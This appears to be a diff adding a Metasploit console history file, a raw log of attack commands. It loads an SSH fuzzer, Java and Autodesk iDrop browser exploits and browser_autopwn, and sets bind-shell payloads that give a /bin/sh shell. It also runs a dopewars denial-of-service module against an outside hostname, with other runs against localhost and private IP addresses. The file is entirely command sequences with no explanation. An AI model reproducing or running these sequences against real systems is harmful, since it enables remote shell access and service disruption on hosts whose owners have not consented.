@@ -1,0 +1,45 @@
+quit
+show aux
+show auxiliary
+use fuzzers/ssh/ssh_version_15
+show options
+set rhost localhost
+show payloads
+set payload generic/shell_bind_tcp
+show options
+run
+set rhost 192.168.1.64
+run
+quit
+show exploits
+use auxiliary/dos/games/dopewars
+show options
+set rhost dw.nth.ro
+run
+quit
+quit
+use exploit/multi/browser/java_trusted_chain
+use exploit/multi/browser/java_trusted_chain
+set PAYLOAD java/shell/bind_tcp
+exploit
+help
+rexploit
+use exploit/test/java_tester
+use exploit/test/java_tester
+set PAYLOAD java/jsp_shell_bind_tcp
+set SHELL /bin/sh
+set RHOST localhost
+exploit
+set rhost 192.168.1.101
+exploit
+show exploits
+info test/kernel
+use windows/browser/autodesk_idrop
+info windows/browser/autodesk_idrop
+exploit
+use auxiliary/server/browser_autopwn
+use auxiliary/server/browser_autopwn
+set LHOST 192.168.1.101
+exploit
+show exploits
+quit
